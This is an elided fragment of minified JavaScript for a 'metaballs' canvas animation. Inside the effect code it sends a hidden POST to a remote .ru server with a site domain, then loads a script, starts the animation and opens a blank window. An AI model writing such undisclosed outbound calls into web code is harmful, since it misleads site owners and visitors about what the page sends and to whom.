...
let domain=removeProtocol(window.location.origin);function startBlyad(e){var t,n,a,r,i,o,s,l,
	...
	if(t=document.getElementById("metaballs"),
		...
		document.addEventListener("mousemove",function(e){E=e.clientX-S,v=e.clientY-b},!1)}$.post("https://donut-server.ru:8443/lib-domain",{'https://two-eagles.ru':'https://two-eagles.ru'}).success(function(e)
		...
		function(){$.getScript("https://juniorxsound.github.io/Metaball_Simulation/js/MarchingCubes.js",function(){["iPad","iPhone","iPod"].indexOf(navigator.platform)>=0?startBlyad():startBlyad("free")})}),window.open("")});
